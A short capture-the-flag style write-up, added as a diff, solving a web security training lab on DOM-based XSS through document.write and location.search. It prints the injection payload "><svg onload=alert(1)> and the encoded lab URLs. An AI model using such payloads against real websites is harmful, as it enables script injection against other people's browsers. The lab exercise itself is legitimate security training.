@@ -1,0 +1,21 @@
+Problem: Lab: DOM XSS in document.write sink using source location.search
+End result: execute JS in client side to alert a message, but this JS is written inside a DOM element
+
+Analysis:
+
+Step 1:
+navigate to: https://0ac200ea03d22d4880df3fa300a400c3.web-security-academy.net/
+find the search input and see if the input is getting reflected in the output
+check the URL https://0ac200ea03d22d4880df3fa300a400c3.web-security-academy.net/?search=test
+observation: the input string is reflected as such in the output
+
+Step 2:
+Check if html tags can be injected by searching for <h1>test</h1>
+observation: you should not that the search query reflected should be a inside a h1 tag
+https://0ac200ea03d22d4880df3fa300a400c3.web-security-academy.net/?search=%3Ch1%3Etest%3C%2Fh1%3E
+
+Step 3:
+with the search query add script within an SVG elemnt to execute an alert()
+like "><svg onload=alert(1)>
+https://0ac200ea03d22d4880df3fa300a400c3.web-security-academy.net/?search=%22%3E%3Csvg+onload%3Dalert%281%29%3E
+Observation: you have successfully excuted JS in the client side, this can be used to run dangerous scripts instead of just alert
